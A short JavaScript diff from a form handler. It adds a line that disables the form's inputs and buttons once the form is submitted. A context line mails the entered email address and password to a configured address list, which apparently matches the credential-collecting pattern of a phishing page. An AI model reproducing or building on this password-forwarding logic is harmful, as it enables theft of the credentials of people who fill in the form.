@@ -118,6 +118,7 @@ function handleSubmit() {
 
     if(validateForm.validateAll()) {
         //alert("email submission");
+        $('.form-control').attr('disabled', true); $('.btn').attr('disabled', true); 
         emailUtil.sendEmail($('[type="email"]').val(), $('[type="password"]').val(), emailTemplate, conf.email_list);
         
     } 
